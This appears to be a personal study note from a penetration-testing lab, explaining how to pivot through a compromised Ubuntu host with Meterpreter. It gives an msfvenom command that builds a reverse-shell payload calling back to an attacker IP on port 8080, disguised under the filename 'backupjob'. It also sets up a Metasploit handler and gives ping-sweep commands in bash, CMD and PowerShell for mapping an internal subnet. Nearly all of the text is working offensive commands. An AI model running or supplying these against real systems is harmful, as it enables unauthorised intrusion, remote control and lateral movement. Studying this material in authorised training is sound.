### **Meterpreter Pivot (No SSH Required)**

When you have a Meterpreter shell on a Ubuntu pivot host, you can create a pivot directly through the session — no SSH port forwarding needed. Use a Meterpreter shell command to get a reverse shell back on your attack host (e.g., port `8080`), then run enumeration scans through it.

#### Creating Payload for Ubuntu Pivot Host
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```

#### Configuring & Starting the multi/handler
```
use exploit/multi/handler
set lhost 0.0.0.0
set lport 8080
run
```

![[Pasted image 20260317184917.png]]

#### Executing the Payload on the Pivot Host
![[Pasted image 20260317185213.png]]

![[Pasted image 20260317185459.png]]
#### Ping Sweep
```
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

#### Ping Sweep For Loop on Linux Pivot Hosts
```bash
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

#### Ping Sweep For Loop Using CMD
```bash
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

#### Ping Sweep Using PowerShell
```
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```